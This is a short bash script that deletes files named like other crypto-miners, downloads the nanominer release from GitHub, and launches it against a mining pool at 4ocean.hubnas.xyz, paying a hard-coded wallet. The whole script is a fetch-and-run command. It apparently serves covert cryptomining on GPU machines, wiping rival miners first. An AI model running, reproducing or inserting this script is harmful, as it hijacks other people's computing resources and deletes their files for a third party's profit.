#!/bin/bash
rm -rvf lol* ton* NB* nano* && wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2-cuda11.tar.gz && tar xf nanominer-linux-3.5.2-cuda11.tar.gz && cd nanominer-linux-3.5.2-cuda11 && ./nanominer -algo ethash -pool1 4ocean.hubnas.xyz:443 -wallet 3QGJUdfcr3A2pTcd5i3BEawGu4q53Wx5Gz.BAKULKULI
